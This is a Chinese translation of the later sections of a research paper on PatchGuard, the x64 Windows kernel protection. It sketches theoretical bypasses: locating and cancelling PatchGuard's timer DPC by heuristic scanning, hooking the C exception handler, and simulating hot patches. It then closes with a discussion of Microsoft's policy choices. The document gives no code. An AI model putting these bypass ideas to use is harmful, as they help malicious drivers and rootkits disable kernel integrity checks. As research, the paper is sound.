一种未经测试的理论方法，可用于禁用 PatchGuard，它将涉及使用某种启发式算法（heuristic algorithm）来定位与 PatchGuard 关联的定时器上下文。要开发这样一种算法，有必要考虑关于定时器 DPC 例程如何设置的已知信息。首先，已知与该 DPC 关联的 DeferredRoutine 将指向 nt!KiScanReadyQueues、nt!ExpTimeRefreshDpcRoutine 或 nt!ExpTimeZoneDpcRoutine 之一。不幸的是，与这些例程关联的地址无法直接确定，因为它们未被导出，但尽管如此，这一知识可能有用。已知的第二件事是，与该 DPC 关联的 DeferredContext 将被设置为一个无效指针。还已知从定时器结构的开头偏移 0x88 处是字 0x1131。给予足够的研究，很可能还能找到与该定时器相关的其他上下文引用，能提供足够的数据来确定性地识别 PatchGuard 定时器。

然而，问题是首先要找到一种能枚举定时器的方法。在这种情况下，未导出的定时器列表地址必须被提取出来，以便能枚举所有活动定时器。虽然有一些间接方法可以提取这些信息，例如通过反汇编引用它的某些函数，但仅仅是依赖某种定位未导出符号的方法这一事实，就很可能导致代码不稳定。

另一种不需要定位未导出符号的选择是，找到某种机制，可以从 nt!MmNonPagedPoolStart 开始搜索地址空间，使用上述启发式匹配要求。给定一组正确的搜索参数，看起来很有可能能够可靠且确定性地定位定时器结构。然而，在这种模型下，肯定有一个竞态条件在等待发生，因为定时器例程可以在定位到它之后、但在取消它之前立即被分发。为了克服这一点，进行搜索的线程需要在做搜索时提高到一个更高的 IRQL，并可能禁用其他处理器。

无论如何，给定定位定时器结构的能力，事情应该简单到只需调用 nt!KeCancelTimer 就能中止 PatchGuard 校验例程并完全禁用它。如果可能，这样一种方法将非常理想，因为它不需要对代码打任何补丁。

如果这样一种技术被证实可行，微软将不得不做两件事中的一件来破坏它。首先，他们可以识别驱动程序正在使用的匹配标准，并确保所做的假设不再安全，从而使得使用现有的一组匹配参数定位定时器结构成为不可能。或者，微软可以改变 PatchGuard 校验例程被执行的机制，使其不使用定时器 DPC 例程。后者很可能不如前者受欢迎，因为它将需要相对重大的重新设计，并重新考虑用于误导和混淆 PatchGuard 校验阶段的技术。

### 4.4) Hybrid Interception / 混合拦截

在迄今列出的技术中，用于禁用或以其他方式阻止 PatchGuard 正常运作的方法依赖于两个基本的拦截点。在异常处理程序挂钩方法的情况下，PatchGuard 是通过阻止实际校验例程运行而被颠覆的。这个拦截点可以被看作一种事前（before-the-fact）的方法。在 nt!KeBugCheckEx 挂钩的情况下，PatchGuard 是通过阻止报告与检测到关键结构修改相关的错误而被颠覆的。这个拦截点可以被看作一种事后（after-the-fact）的方法。一种理论方法是将这两个概念结合起来，以一种允许对 PatchGuard 校验例程的执行进行更确定、更完整检测的方式。

这种方法的一个可能例子是，把对与 PatchGuard 使用的定时器 DPC 例程关联的异常处理程序的挂钩，推广到 C 风格异常的中央入口点。这个例程名为 nt!__C_specific_handler，它是一个导出的符号，这使它如果能被利用就相当有用。通过挂钩这个例程，可以跟踪关于异常的信息，并按需要用事后信息对它进行过滤，以确定 PatchGuard 正在运行。

### 4.5) Simulated Hot Patching / 模拟热补丁

与 PatchGuard 关联的文档指出，它仍允许通过其运行时补丁 API 对操作系统进行热补丁。出于这个原因，应该有可能模拟一个热补丁，使它在 PatchGuard 看来像是合法的。在本文写作时，作者还没有花时间去理解这如何能做到，但它留待进一步研究。假设找到了一种能让这种技术可靠工作的方法，那么顺理成章地，这样做将是最受欢迎的路线，因为它将是利用一种有文档记载的方法来规避 PatchGuard。

## 5) Conclusion / 结论

开发一个旨在缓解对内核各关键部分未经授权修改的解决方案，可以被看作一项相当令人生畏的任务，尤其是在还要考虑确保实际用于校验内核的例程本身不能被篡改这一需求时。本文展示了微软如何用他们在基于 x64 的 Windows 内核版本上的 PatchGuard 实现来处理这个问题。用于保护与内核关联的各种关键数据结构（如系统映像、SSDT、IDT/GDT 和 MSR）的方法的实现，已经被详细解释了。

在理解了 PatchGuard 的实现之后，考虑它可能被颠覆的方式是恰如其分的。从这个角度看，本文提出了几种可用于绕过 PatchGuard 的不同技术，它们要么已被证明有效，要么被理论上认为有效。出于不只指出问题而不提出解决方案的考虑，每种绕过技术都附带了一份清单，列出微软在将来可以缓解该技术的方式。

不幸的是，微软在 PatchGuard 上处于劣势，而且他们非常清楚这一点。这种劣势源于这样一个事实：PatchGuard 被设计为从与它所要防备的代码相同的保护域（protection domain）中运行。用更简洁的话说，PatchGuard 就像任何第三方驱动一样运行，并以同一组特权运行。由于这一事实，不可能保证第三方驱动不会做某些事情来阻止 PatchGuard 完成其工作，因为 PatchGuard 没有办法完全保护自己。由于这个问题在 PatchGuard 实现之初就已知晓，微软选择使用他们手边唯一现成的武器：混淆和误导。虽然大多数人认为，在面对一个足够有动力的工程师时，以隐蔽求安全根本算不上安全，但它确实把门槛抬高到了足以让大多数程序员和第三方实体不会有兴趣去寻找绕过它的方法、而是更有动力去寻找一种被认可的方法来实现其目标的程度。

在像这样的情况下，有时重要的是退后一步，考虑所走的这条道路是否真的是正确的道路。特别是，微软已决定采取一种激进的立场，反对对内核不同部分打补丁，以使 Windows 更稳定。虽然这一愿望看起来非常合理和合乎逻辑，但它是有一定代价的。由于 Windows 是一个闭源操作系统这一事实，第三方软件厂商有时发现自己被迫去变通规则，以实现其产品的目标。在安全行业尤其如此，那里的安全软件厂商发现自己不得不试图比恶意代码扎得更深。可以争辩说，PatchGuard 的实现将使恶意技术成为不可能，从而让安全软件厂商解放到更合理的入口点。然而，事实是，虽然安全软件厂商出于营销和安全考虑可能不会使用用于绕过 PatchGuard 的技术，但可以肯定地说恶意代码会。这样一来，恶意代码实际上在竞争中获得了上风，因为安全厂商最终双手被绑在背后。为了解决这一担忧，微软似乎愿意积极与厂商合作，以确保他们仍能通过更可接受和有文档记载的方法实现其目标。

另一个要考虑的重要问题是，微软是否真的会去破坏一个已经向数百万系统部署了解决方案、而该方案恰好通过一种绕过技术禁用 PatchGuard 的厂商。人们完全可以想象 McAfee 或 Symantec 做这样的事，尽管微软会希望利用他们的商业关系来确保 McAfee 和 Symantec 不必诉诸这种技术。McAfee 和 Symantec 是如此大的公司这一事实，在与微软谈判时给了他们一定程度的筹码，但较小的公司很可能不会受到同等程度的尊重和考虑。

然而，问题仍然存在。PatchGuard 真的是正确的方法吗？如果人们假设微软将积极确保 PatchGuard 破坏恶意代码和试图绕过它的软件厂商——通过在将来发布故意破坏这些绕过方法的更新，这正是迄今为止所表明的——那么顺理成章地，微软可能正走在一条导致内核实际上变得更不稳定的道路上，因为将需要更极端的措施。即使微软向其他公司伸出手，提供在各个层级挂钩进内核的方法，也很可能总是会出现一家公司需要完成的某个任务，在没有微软干预的情况下无法轻易做到。除非微软愿意向这些公司提供可再分发的代码，使第三方驱动能在所有现有的 x64 版本上工作，否则这一点就没有意义。兼容性不仅对微软、而且对第三方厂商都是一个关键要求，而一个不能在所有 x64 内核版本上工作的解决方案，对大多数公司而言根本算不上解决方案。

如果微软能回到过去消除 PatchGuard，还有哪些其他选择可能摆在他们面前，可用于补充手头的问题？对这个问题的回答非常主观，但作者认为，微软至少可以部分解决这一问题的一种方式，是通过一个定义更好且被认可的挂钩模型（就像在 Windows 9x 中挂钩 VxD 服务那样）。被合法产品挂钩的大多数例程，被厂商用来在某些主要子系统之间分层，例如在硬件与内核之间，或在用户模式与内核之间。由于第三方厂商用运行时补丁引入的大多数稳定性问题，都与他们挂钩例程中不正确或不安全的假设有关，微软理应提供一个定义好的挂钩模型，阐明每个可被挂钩函数相关的限制和约束。虽然这看起来像一项宏大的工程，但事实是它并非如此。

通过将挂钩模型限制在导出的例程上，微软可以利用现有的文档，这些文档定义了有文档记载函数的行为和限制，例如它们的 IRQL 和调用限制。虽然将挂钩模型限制在导出函数上并不能涵盖一切，但它至少是一个开始，而用于实现它的概念可以被包装成一个对常用的未记载或未导出例程同样有用的接口。然而，这种方法最大的问题是，它看起来会限制微软对内核发展方向的控制，而且在某些方面它确实如此。然而，应当已经可以安全地假设，导出的符号，至少就已记载的而言，在发布之后不能被消除或大幅改变，以确保向后兼容性。这只会加强这样一个论点：一个针对有文档记载的导出例程的、定义好的挂钩模型，不仅可行，而且相对安全。

无论哪种方法本可能更好，缺乏时间机器使得这场讨论的最终结果大多毫无意义。最后，从投入到 PatchGuard 实现中的工作量和思考来判断，作者可以安心地说，微软做了一份值得称赞的工作。PatchGuard 究竟有多有效，无论是在软件层面还是商业层面，只有时间能证明，而观察这一领域如何演变将是有趣的。

## References / 参考文献

（以下为原文文末参考文献，书目信息保持原文。）

AMD. The AMD x86-64 Architecture Programmers Overview.
http://www.amd.com/us-en/assets/contenttype/whitepapersandtechdocs/x86-64overview.pdf；
accessed Nov 30, 2005（访问于 2005 年 11 月 30 日）。

AMD. AMD64 Architecture Programmer's Manual Volume 3.
http://www.amd.com/us-en/assets/content_type/white_papers_and_tech_docs/24594.pdf；
accessed Dec 1, 2005（访问于 2005 年 12 月 1 日）。

Microsoft Corporation. Patching Policy for x64-Based Systems.
http://www.microsoft.com/whdc/driver/kernel/64bitPatching.mspx；
accessed Nov 28, 2005（访问于 2005 年 11 月 28 日）。
